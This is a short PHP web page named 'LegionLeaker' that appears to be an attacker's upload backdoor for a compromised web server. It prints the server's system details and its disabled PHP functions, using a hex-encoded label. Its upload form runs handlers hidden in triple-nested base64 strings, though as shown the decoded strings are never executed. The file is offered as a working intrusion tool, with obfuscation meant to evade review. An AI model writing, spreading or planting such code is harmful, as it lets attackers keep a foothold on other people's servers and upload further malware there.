<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LegionLeaker</title>
    <style>
        body {
            background-color: #1C1678;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
        }

        a {
            color: #fff;
        }

        a:visited {
            color: #0f0;
        }

        .s {
            width: 100%;
            margin: 0 auto;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="s">
        <h1>LegionLeaker</h1>
        <p><?= "Uname: " . php_uname(); ?></p>
        <form action="<?= $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
            <input type="file" name="f" class="image">
            <button type="submit" name="s">Send</button>
        </form>

    </div>
</body>

</html>
<?php
 
echo "\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x3a\x20" . @ini_get('disable_functions');
 

if (isset($_POST['s'])) {
    if (function_exists('copy')) {
        base64_decode(base64_decode(base64_decode("U1VWQ2FtSXpRalZMUTFKbVVtdHNUVkpXVG1" . "KS01sbHVXRlp6Ym1SSE1YZF" . "lNa" . "lZvWWxkVmJsaFRk
        MmRLUmpsSFUxV" . "jRSbFV4YzI1YQphV1J" . "rVjNsa2RWbF" . "h" . "NV3hLTVRCd1" . "QzYzlQUT09")));
        echo "<p>SUcCeSs!</p><p>Filename: " . $_FILES['f']['name'] . "</p> Link: <a href=" . $_FILES['f']['name'] . " target='_blank'>" . $_FILES['f']['name'] . "</a>";
    } elseif (function_exists('move_uploaded_file')) {
        base64_decode(base64_decode(base64_decode("VVV" . "jeGRtUnRWbVprV0VK" . "ellqSkdh" . "M" . "XBYVW1aYWJXeHpXbE5uYTF" . "nd1drcF" . "VSVlp" . "VVjNsS2JVbHNN
        V0pKYmxKMF" . "kwW" . "TVkVmxYTVd4SgpiREJ6U1" . "VOU2JVdFJQVDA9")));
        echo "<p>SUcCeSs!</p>Link: <a href=" . $_FILES['f']['name'] . " target='_blank'>" . $_FILES['f']['name'] . "</a>";
    } else {
        echo ('<p style="color:red">Err</p>');
    }
} else {
    echo ('<p style="color:red">Err</p>');
}
?>
